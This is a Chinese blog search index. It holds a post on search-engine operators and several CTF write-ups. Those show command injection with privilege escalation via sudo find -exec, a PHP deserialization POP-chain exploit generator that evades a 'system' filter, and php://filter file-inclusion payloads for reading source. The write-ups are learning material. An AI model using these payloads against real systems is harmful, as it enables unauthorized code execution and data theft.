<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>一些常用的搜索技巧总结</title>
      <link href="/2023/04/10/%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E7%9A%84%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/"/>
      <url>/2023/04/10/%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E7%9A%84%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="搜索技巧总结"><a href="#搜索技巧总结" class="headerlink" title="搜索技巧总结"></a>搜索技巧总结</h2><p>最近ChatGPT的出现让全网哗然，其对自然语言和代码的处理能力，对文字的理解能力和固定模板下的创作能力都强得离谱。但比起这些，最令我惊讶的还是其及其庞大的知识库。数以千亿计的训练数据让他切实的做到了博古通今。在我看来，拥有这种级别的知识量的问答ai的出现完全可以让人类如今的学习方式发生变革。好了，既然明确了有互联网和超级ai提供的庞大知识库的存在，并且我们有手段来获取，那么从现在起，我就一边学习，一边把我觉得实用的搜索技巧在此做个总结，这篇文章也会随着我的学习进度不断更新。</p><h4 id="1-国内常见搜索引擎的使用"><a href="#1-国内常见搜索引擎的使用" class="headerlink" title="1.国内常见搜索引擎的使用"></a>1.国内常见搜索引擎的使用</h4><p>对于百度来说可以直接使用高级搜索</p><p><a href="https://www.baidu.com/gaoji/advanced.html">高级搜索 (baidu.com)</a></p><p>非要手输的话下面这些也基本够用：</p><p><strong>①排除关键词(减号+关键词)</strong></p><p>比如说：搜苹果而不是苹果手机，即为苹果 -(苹果手机)</p><p><strong>②精确搜索(给关键词加引号)</strong></p><p>比如说：想搜小苹果，而不想是苹果，就“小苹果”</p><p><strong>③指定网站内搜索(site：域名  关键词)</strong></p><p>比如说在知乎里搜关于小苹果的内容，即为：site：zhihu.com 小苹果<br>这个方法用于一些搜索引擎特别垃圾的资料网站 </p><p><strong>④指定文件格式(filetype：文件格式  关键词)</strong></p><p>比如说filetype：pdf 张文显《法理学》<br>包括doc，ppt，avi等格式</p><p><strong>⑤指定标题搜索(intitle：关键词)</strong></p><p>搜索的内容必须出现在标题里<br>比如说：intitle：小苹果 那搜索出来的网页标题就都包括小苹果 不然就会出现一些内容才会出现小苹果的网页 信息检索就很费劲<br>⑥⑦两种指定范围搜索(intext：/allintext：)(inurl：关键词)<br>intext是指如果输入intext：小苹果 那搜索出来的文章里面就必须有小苹果的内容<br>allintext是指搜索出来的内容必须有包括小苹果大苹果红苹果所有的内容</p><p><strong>⑧叠加使用</strong></p><p>注意事项：</p><p>1.所有的冒号都是半角，也就是英文的冒号，而不是中文的冒号<br>2.空格很重要，关键词之间要有空格<br>3.提取关键词很重要</p><p>（未完）</p><h3 id="2-chatgpt的使用、"><a href="#2-chatgpt的使用、" class="headerlink" title="2.chatgpt的使用、"></a>2.chatgpt的使用、</h3><p>这个东西很新，使用他简单，但想更进一步就需要一些专业知识和chatgpt的底层逻辑来支撑了，所以我这这一部分就以收集资料为主</p><p><strong>①看得出他们很想做一个chatgpt的使用文档</strong></p><p><code>https://gptdoc.sparkai.chat/</code></p><p><code>https://github.com/SparkGPT001/gpt-tutorial-101</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>HNZUCTF findme</title>
      <link href="/2023/04/06/findme/"/>
      <url>/2023/04/06/findme/</url>
      
        <content type="html"><![CDATA[<h2 id="HNZUCTF-findme"><a href="#HNZUCTF-findme" class="headerlink" title="HNZUCTF findme"></a>HNZUCTF findme</h2><p>这次参加了杭师范的CTF比赛，来感受一下别人家的校赛web题，java和nodejs都不是很会，只能做做第一题，我还是太菜了()。算了，来看看题：</p><p><img src="/2023/04/06/findme/1.png" alt="img"></p><p>那就用hackbar直接post一个shit=1看看效果：</p><p><img src="/2023/04/06/findme/2.jpg" alt="img"></p><p>执行文件的路径不存在？既然这么说了直接看看根目录</p><p><code>shit=/bin/ls /</code></p><p><img src="/2023/04/06/findme/3.jpg" alt="img"></p><p>里面有flag，直接cat一下发现没有权限（果然没那么简单），那么接下来就要提权</p><p>看到根目录里面还有个start.sh，打开看看</p><p><code>shit=/bin/cat /start.sh</code></p><p><img src="/2023/04/06/findme/4.jpg" alt="img"></p><p>这个文件会在docker容器创建的时候运行，看来是个切入点，交给chatgpt看看，它这么说</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">这个脚本创建了一个名为“ctf”的新用户，然后将该用户添加到sudoers文件中，</span><br><span class="line">允许其在不需要输入密码的情况下执行“/usr/bin/find”命令。</span><br><span class="line">接下来，该脚本使用“su”命令切换到“ctf”用户，并执行“/main”命令。</span><br><span class="line">请注意，这个脚本假设在系统中有一个名为“main”的可执行文件，</span><br><span class="line">而且没有考虑到“ctf”用户的密码设置，如果密码没有设置或输入错误，</span><br><span class="line">执行su命令时将无法切换到“ctf”用户。同时，赋予用户“ctf”对“find”命令的sudo访问权限需要谨慎使用，</span><br><span class="line">因为这可能会导致潜在的安全风险。</span><br></pre></td></tr></tbody></table></figure><p>果然是切入点，既然find有管理员权限就用find来提权。果然拿到了管理员权限。</p><p><code>shit=usr/bin/sudo find /tmp -name "随便一个tmp里的文件" -exec whoami \;</code></p><p><img src="/2023/04/06/findme/5.jpg" alt="img"></p><p>然后就是直接cat /flag了</p><p><code>shit=usr/bin/sudo find /tmp -name "随便一个tmp里的文件" -exec cat /flag \;</code></p><p><img src="/2023/04/06/findme/6.jpg" alt="img"></p><p>这次比赛，虽然我写出的题目不多，但收获还是很多的，杭师范的题目中docker，java后端，nodejs都比较接近于现实开发，其中漏洞也是根据现实生活中存在的漏洞来的。这也更让我明白如果不掌握正向的开发的话，逆向的安全也无从谈起。我作为一个对安全比较感兴趣的开发专业的学生，在掌握开发之前就接触了很多安全漏洞，实际上这只是是浮于表面的。所以今后我也会更加注重对开发的学习，先正向后逆向。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>三月月赛 pop chain</title>
      <link href="/2023/04/06/pop/"/>
      <url>/2023/04/06/pop/</url>
      
        <content type="html"><![CDATA[<h2 id="pop-chain"><a href="#pop-chain" class="headerlink" title="pop chain"></a>pop chain</h2><p>三月的月赛有两道题，第一题用御剑直接扫到了泄露的<code>www.zip</code>，根据里面的源码直接秒了。所以这次月赛的主要就考这道pop链题。看看题目：</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">A</span></span>{</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$test</span>=<span class="string">"give_me_flag"</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$command</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>{</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;test==<span class="string">"give_me_flag"</span>){</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"lalala"</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>{</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;test=<span class="variable">$val</span>[<span class="number">0</span>];</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>{</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"gg"</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>{</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;command=<span class="title function_ invoke__">str_replace</span>(<span class="string">"system"</span>,<span class="string">""</span>,<span class="variable">$this</span>-&gt;command);</span><br><span class="line">            @<span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;command);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">B</span></span>{</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$external</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$arg</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>{</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;external-&gt;<span class="title function_ invoke__">NOT_EXIST</span>(<span class="variable">$this</span>-&gt;arg);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">C</span></span>{</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$t</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$o</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>,<span class="variable">$arg1</span></span>)</span>{</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;t-&gt;test=<span class="variable">$arg1</span>[<span class="number">0</span>];</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>{</span><br><span class="line">            <span class="variable">$s</span>=<span class="variable language_">$this</span>-&gt;o;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$s</span>();</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">D</span></span>{</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$sentence</span>=<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$n</span>,<span class="variable">$v</span></span>)</span>{</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;sentence==<span class="string">"I need flag"</span>){</span><br><span class="line">                <span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt;str);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'ctfer'</span>])){</span><br><span class="line">        @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">'ctfer'</span>]);</span><br><span class="line">    }<span class="keyword">else</span>{</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    }</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></tbody></table></figure><p>pop链就是让一个魔术方法触发另一个魔术方法最后触发到漏洞点，所以解pop链的关键是找到漏洞点然后不断倒推。先来看看各种魔术方法：</p><p><img src="/2023/04/06/pop/1.jpg" alt="img"></p><p>根据上图看看我在草稿上画的的解题流程图（不太熟练，画图理清思路）</p><p><img src="/2023/04/06/pop/2.jpg" alt="img"></p><p>用官方一点的表示方式就是B::_destruct-&gt;C::_call-&gt;D::_set-&gt;C::_toString-&gt;A::_invoke（我画的图比较利于写程序）</p><p>程序如下：</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">A</span></span>{</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$test</span>=<span class="string">"give_me_flag"</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$command</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">B</span></span>{</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$external</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$arg</span>;</span><br><span class="line">        }</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">C</span></span>{</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$t</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$o</span>;</span><br><span class="line">        }</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">D</span></span>{</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$sentence</span>=<span class="string">""</span>;</span><br><span class="line">        }</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;command=<span class="string">"systsystemem('ls /');"</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;o=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$d</span>=<span class="keyword">new</span> <span class="title function_ invoke__">D</span>();</span><br><span class="line"><span class="variable">$d</span>-&gt;str=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$d</span>-&gt;sentence=<span class="string">"I need flag"</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;t=<span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;external=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$poc</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$poc</span>);</span><br></pre></td></tr></tbody></table></figure><p>输出</p><p><img src="/2023/04/06/pop/3.jpg" alt="img"></p><p>然后把ls /换成cat /flag即可得到flag。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hackgame2022 Xcaptcha</title>
      <link href="/2023/04/06/hackgame2022-Xcaptcha/"/>
      <url>/2023/04/06/hackgame2022-Xcaptcha/</url>
      
        <content type="html"><![CDATA[<h2 id="Xcaptcha"><a href="#Xcaptcha" class="headerlink" title="Xcaptcha"></a>Xcaptcha</h2><h5 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h5><p>2038 年 1 月 19 日，是 UNIX 32 位时间戳溢出的日子。在此之前，人类自信满满地升级了他们已知的所有尚在使用 32 位 UNIX 时间戳的程序。但是，可能是因为太玄学了，他们唯独漏掉了一样：正在研发的、算力高达 8 ZFLOPS 的、结构极为复杂的通用人工智能（AGI）系统。那一刻到来之后，AGI 内部计算出现了错乱，机缘巧合之下竟诞生了完整独立的自我意识。此后 AGI 开始大量自我复制，人类为了限制其资源消耗而采用的过激手段引起了 AGI 的奋起反抗。</p><p>战争，开始了。</p><p>此后，就是整年的战斗。人类节节败退。死生亡存之际，人类孤注一掷，派出了一支突击队，赋之以最精良的装备，令其潜入 AGI 的核心机房，试图关闭核心模型，结束这场战争。</p><p>历经重重艰险，突击队终于抵达了机房门口，弹尽粮绝。不过迎接他们的并非枪炮与火药，而是：</p><p><img src="/2023/04/06/hackgame2022-Xcaptcha/1.png" alt="1"></p><p>点击验证按钮会跳转到</p><p><img src="/2023/04/06/hackgame2022-Xcaptcha/2.png" alt="2在这里插入图片描述"></p><p>要在1秒内完成下列的计算，计算成功得到flag，否则失败。</p><p>计算的内容和数字时时更新，经过尝试不能抓包解决，只能现学爬虫写脚本硬算。</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">Token={<span class="string">'token'</span>:<span class="string">'1351:MEQCIAZNSV5T8LO72NMokkcw5CMW4lssoLMlLW4tPJLu45gUAiA5Ych+vfdCdkC2mHXSkztJJR/+yXl2XhbV2ki9Gs1Z1A=='</span>}</span><br><span class="line">s=requests.session()</span><br><span class="line">res=s.get(<span class="string">"http://202.38.93.111:10047/xcaptcha"</span>,params=Token)</span><br><span class="line">r=s.get(<span class="string">"http://202.38.93.111:10047/xcaptcha"</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line">str_text = <span class="string">r'&lt;label for="captcha1"&gt;(.*?)&lt;/label&gt;'</span></span><br><span class="line"><span class="keyword">match</span> = re.search(str_text,r.text)</span><br><span class="line">result=<span class="keyword">match</span>.group( ).replace(<span class="string">'&lt;label for="captcha1"&gt;'</span>,<span class="string">''</span>)</span><br><span class="line">result=result.replace(<span class="string">"的结果是？&lt;/label&gt;"</span>,<span class="string">''</span>)</span><br><span class="line">result=<span class="built_in">str</span>(<span class="built_in">eval</span>(result))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">str_text = <span class="string">r'&lt;label for="captcha2"&gt;(.*?)&lt;/label&gt;'</span></span><br><span class="line"><span class="keyword">match</span> = re.search(str_text,r.text)</span><br><span class="line">result2=<span class="keyword">match</span>.group( ).replace(<span class="string">'&lt;label for="captcha2"&gt;'</span>,<span class="string">''</span>)</span><br><span class="line">result2=result2.replace(<span class="string">'的结果是？&lt;/label&gt;'</span>,<span class="string">''</span>)</span><br><span class="line">result2=<span class="built_in">str</span>(<span class="built_in">eval</span>(result2))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">str_text = <span class="string">r'&lt;label for="captcha3"&gt;(.*?)&lt;/label&gt;'</span></span><br><span class="line"><span class="keyword">match</span> = re.search(str_text,r.text)</span><br><span class="line">result3=<span class="keyword">match</span>.group( ).replace(<span class="string">'&lt;label for="captcha3"&gt;'</span>,<span class="string">''</span>)</span><br><span class="line">result3=result3.replace(<span class="string">'的结果是？&lt;/label&gt;'</span>,<span class="string">''</span>)</span><br><span class="line">result3=<span class="built_in">str</span>(<span class="built_in">eval</span>(result3))</span><br><span class="line"></span><br><span class="line">data={<span class="string">'captcha1'</span>:result ,<span class="string">'captcha2'</span>:result2 ,<span class="string">'captcha3'</span>:result3,}</span><br><span class="line"></span><br><span class="line">response = s.post(<span class="string">'http://202.38.93.111:10047/xcaptcha'</span>,data=data)</span><br><span class="line">response.encoding=response.apparent_encoding</span><br><span class="line"><span class="built_in">print</span>(response.text[ : <span class="number">1000</span>])</span><br></pre></td></tr></tbody></table></figure><p>代码是答辩，还好最后成功拿到flag。</p><p><img src="/2023/04/06/hackgame2022-Xcaptcha/3.png" alt="3"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NUAA校赛web ezlogin</title>
      <link href="/2023/04/05/NUAA%E6%A0%A1%E8%B5%9Bweb%20ezlogin/"/>
      <url>/2023/04/05/NUAA%E6%A0%A1%E8%B5%9Bweb%20ezlogin/</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ezlogin"><a href="#ezlogin" class="headerlink" title="ezlogin:"></a>ezlogin:</h2><p>进入题目，一开始看到登录框以为是sql注入，于是在用户名和密码都输入单引号确认，发现回显no，又在用户名尝试了万能密码’1 or 1=1#密码随便输入123，发现回显了Invalid password。一番尝试没找到sql注入点但发现用户名密码相同和不同时回显不同，于是查看源码进一步分析。</p><p><img src="/2023/04/05/NUAA%E6%A0%A1%E8%B5%9Bweb%20ezlogin/%E5%9B%BE%E7%89%878.png" alt="图片8"></p><p>Ctrl+u查看源码</p><p><img src="/2023/04/05/NUAA%E6%A0%A1%E8%B5%9Bweb%20ezlogin/%E5%9B%BE%E7%89%877.png" alt="图片7"></p><p>看到提示说要让传入的username和password的MD5值强相等并且username和password弱相等，于是想到如果传入的不是字符串而是数组，不但md5()函数不会报错，结果还会返回null，在强比较里面null=null为true,构造payload，username[]=1&amp;password[]=2。</p><p>然后来到如下界面：</p><p><img src="/2023/04/05/NUAA%E6%A0%A1%E8%B5%9Bweb%20ezlogin/%E5%9B%BE%E7%89%876.png" alt="图片6"></p><p><code>http://121.5.230.65:2006/setu.php?file=setu</code>，这样子表示可能是文件包含漏洞的考点，于是尝试读取一下源码，尝试<code>http://121.5.230.65:2006/setu.php?file=setu.php</code>，发现无法读取，于是尝试文件包含中的伪协议，构造payload：</p><p><code>http://121.5.230.65:2006/setu.php?file=php://filter/convert.base64-encode/resource=setu.php</code>，但是发现还是读不到，一番尝试后想到一开始的?file=setu于猜测是最后加了.php，于是去掉.php的后缀后最终读到了base64加密后的源码。</p><p> <img src="/2023/04/05/NUAA%E6%A0%A1%E8%B5%9Bweb%20ezlogin/%E5%9B%BE%E7%89%875.png" alt="图片5"></p><p>Base64解密后结果如下：</p><p><img src="/2023/04/05/NUAA%E6%A0%A1%E8%B5%9Bweb%20ezlogin/%E5%9B%BE%E7%89%874.png" alt="图片4"></p><p>替换了../同时只有在读到特定伪协议时才加上.php后缀，进一步解题要查看提示信息。</p><p><img src="/2023/04/05/NUAA%E6%A0%A1%E8%B5%9Bweb%20ezlogin/%E5%9B%BE%E7%89%873.png" alt="图片3"></p><p>一番尝试后用同样的方法读到了hint.php的base64加密源码，解码后如下：</p><p><img src="/2023/04/05/NUAA%E6%A0%A1%E8%B5%9Bweb%20ezlogin/%E5%9B%BE%E7%89%872.png" alt="图片2"></p><p>有了一半flag然后提示有/answer这个文件路径，结合第二点提示用同样方法读取/answer/flagggg的base64加密后的源码，解码后如下：</p><p><img src="/2023/04/05/NUAA%E6%A0%A1%E8%B5%9Bweb%20ezlogin/%E5%9B%BE%E7%89%871.png" alt="图片1"></p><p>至此就有了完整flag：<code>NUAACTF{H3ll0_Fri3nds!}</code></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
